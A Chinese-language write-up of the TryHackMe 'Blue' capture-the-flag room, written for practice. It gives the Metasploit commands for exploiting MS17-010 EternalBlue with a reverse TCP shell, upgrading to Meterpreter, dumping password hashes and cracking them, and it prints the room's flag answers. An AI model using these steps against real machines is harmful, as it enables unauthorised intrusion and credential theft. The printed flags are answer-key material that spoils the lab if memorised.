# Blue-练习

TryHackMe实验房间链接：https://tryhackme.com/room/blue

## Recon （侦察-信息收集阶段）

使用nmap进行端口扫描:

```shell
nmap -sV -vv --script vuln 10.10.100.31           #nmap -sV -vv --script vuln TARGET_IP
```

![image-20221006121232447](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006121232447.png)

![image-20221006121440607](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006121440607.png)

**答题卡**

![image-20221006120152100](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006120152100.png)

## Gain Access（获取目标权限）

执行exp在目标机器上获得立足点。

启动msf，搜索exp代码，参考相关选项，设置相关参数，执行exp

```shell
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.100.31
set payload windows/x64/shell/reverse_tcp    #使用默认的payload也可以
run
```

![image-20221006122617559](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006122617559.png)

![image-20221006122814091](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006122814091.png)

**答题卡**

![image-20221006122857577](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006122857577.png)

## Escalate （提升权限）

使用命令，将上一步骤中获得的shell转换为meterpreter shell

```shell
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
sessions -l
set SESSION 1
run
sessions -l
sessions -i 2
```

![image-20221006123816402](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006123816402.png)

![image-20221006123910236](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006123910236.png)

得到meterpreter shell之后，迁移当前进程到高权限用户下，以此提升meterpreter权限

![image-20221006124319584](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006124319584.png)

![image-20221006124456868](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006124456868.png)

![image-20221006124542565](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006124542565.png)

**答题卡**

![image-20221006132423216](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006132423216.png)

## Cracking （破解密码hash）

转储非默认用户的密码并破解它。

```shell
hashdump
```

![image-20221006132804855](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006132804855.png)

直接使用在线网站破解，也可以通过使用rockyou.txt字典结合破解工具进行hash破解。

![image-20221006132730856](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006132730856.png)

![image-20221006133808522](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006133808522.png)

**答题卡**

![image-20221006133837807](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006133837807.png)

## Find flags（寻找flag）

使用命令查找flag文件

![image-20221006140158604](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006140158604.png)

![image-20221006140656884](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006140656884.png)

**答题卡**

> flag{access\_the\_machine}
>
> flag{sam\_database\_elevated\_access}
>
> flag{admin\_documents\_can\_be\_valuable}

![image-20221006141555023](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006141555023.png)
